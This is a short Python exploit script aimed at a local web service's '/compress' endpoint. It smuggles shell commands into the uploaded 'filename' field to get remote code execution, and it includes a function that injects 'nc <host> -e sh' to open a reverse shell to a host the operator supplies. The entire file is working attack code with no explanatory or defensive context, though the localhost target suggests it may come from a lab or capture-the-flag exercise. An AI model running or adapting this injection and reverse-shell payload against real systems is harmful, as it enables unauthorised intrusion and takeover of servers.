#!/usr/bin/env python3

import requests
from sys import argv


url = "http://localhost:8080/compress"


def initial():
    requests.post(
        url,
        data={
            "filename": "initial.gz",
            "contents": "this is the base content"
        }
    )


def rce(cmd):
    req = requests.post(
        url,
        data={
            "filename": "|\n;e {}\n#.gz".format(cmd),
            "contents": "payload testing",
        }
    )
    return req.text


def reverseShell(host):
    cmd = "nc {} -e sh".format(host)
    req = requests.post(
        url,
        data={
            "filename": "|\n;e {}\n#.gz".format(cmd),
            "contents": "payload for reverse shell",
        }
    )
    return req.text


def main():
    cmd = str(argv[1])

    initial()
    print(rce(cmd))


if __name__ == "__main__":
    if (len(argv) < 2):
        print("Usage: {} <cmd>".format(argv[0]))
    elif (len(argv) == 3 and argv[1] == "revshell"):
        reverseShell(argv[2])
    else:
        main()
